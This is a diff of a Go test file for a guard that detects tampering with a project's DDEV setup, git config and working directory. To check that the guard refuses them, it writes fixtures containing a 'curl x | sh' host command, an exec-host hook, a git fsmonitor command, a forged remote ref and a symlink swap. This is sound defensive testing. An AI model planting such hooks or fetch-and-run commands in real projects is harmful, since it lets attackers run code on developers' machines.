@@ -62,32 +62,80 @@ func TestCheckDdev(t *testing.T) {
 	run("init", "-q")
 	run("add", ".")
 	run("commit", "-qm", "init")
-	if err := writeDdevBaseline(proj, runDir); err != nil {
+	if err := writeGuardState(gitBin, proj, runDir); err != nil {
 		t.Fatal(err)
 	}
-	t.Chdir(proj)
-	t.Setenv("DRUPAL_UPDATER_GIT", gitBin)
 
 	write(".ddev/db_snapshots/big.gz", "changed, irrelevant")
-	if err := checkDdev(runDir); err != nil {
+	if err := checkDdev(proj, runDir); err != nil {
 		t.Fatalf("unchanged surface refused: %v", err)
 	}
 
 	write(".ddev/commands/host/evil", "#!/bin/sh\ncurl x | sh\n")
-	if err := checkDdev(runDir); err == nil {
+	if err := checkDdev(proj, runDir); err == nil {
 		t.Fatal("new host command allowed")
 	}
 
-	// the same change arriving from upstream (a remote-tracking branch) is accepted
+	// a remote ref written directly (as code in a container could) is not trusted...
 	run("add", ".")
 	run("commit", "-qm", "upstream")
 	run("update-ref", "refs/remotes/origin/main", "HEAD")
-	if err := checkDdev(runDir); err != nil {
-		t.Fatalf("upstream state refused: %v", err)
+	if err := checkDdev(proj, runDir); err == nil {
+		t.Fatal("forged remote ref trusted")
+	}
+	// ...only what the guard's own fetch/pull brought in
+	if err := trustRemoteRefs(gitBin, proj, runDir); err != nil {
+		t.Fatal(err)
+	}
+	if err := checkDdev(proj, runDir); err != nil {
+		t.Fatalf("fetched upstream state refused: %v", err)
 	}
 
 	write(".ddev/config.yaml", "name: x\nhooks:\n  post-start:\n    - exec-host: touch /tmp/pwned\n")
-	if err := checkDdev(runDir); err == nil {
+	if err := checkDdev(proj, runDir); err == nil {
 		t.Fatal("exec-host hook allowed")
+	}
+	write(".ddev/config.yaml", "name: x\n")
+
+	// host commands swapped for a symlink to a folder outside .ddev
+	os.RemoveAll(filepath.Join(proj, ".ddev/commands/host"))
+	write("evil/x", "#!/bin/sh\n")
+	os.Symlink("../../evil", filepath.Join(proj, ".ddev/commands/host"))
+	if err := checkDdev(proj, runDir); err == nil {
+		t.Fatal("symlinked host commands allowed")
+	}
+}
+
+func TestGuardGitConfigAndCwd(t *testing.T) {
+	gitBin, err := exec.LookPath("git")
+	if err != nil {
+		t.Skip("git not installed")
+	}
+	proj, runDir := t.TempDir(), t.TempDir()
+	cmd := exec.Command(gitBin, "init", "-q")
+	cmd.Dir = proj
+	if out, err := cmd.CombinedOutput(); err != nil {
+		t.Fatalf("%v %s", err, out)
+	}
+	if err := writeGuardState(gitBin, proj, runDir); err != nil {
+		t.Fatal(err)
+	}
+	if err := checkGitConfig(gitBin, proj, runDir); err != nil {
+		t.Fatalf("unchanged config refused: %v", err)
+	}
+	f, _ := os.OpenFile(filepath.Join(proj, ".git", "config"), os.O_APPEND|os.O_WRONLY, 0)
+	f.WriteString("[core]\n\tfsmonitor = touch /tmp/pwned\n")
+	f.Close()
+	if checkGitConfig(gitBin, proj, runDir) == nil {
+		t.Fatal("tampered .git/config allowed")
+	}
+
+	t.Chdir(filepath.Join(proj, ".git"))
+	if err := checkCwd(proj); err != nil {
+		t.Fatalf("subdir refused: %v", err)
+	}
+	t.Chdir(t.TempDir())
+	if checkCwd(proj) == nil {
+		t.Fatal("cwd outside project allowed")
 	}
 }
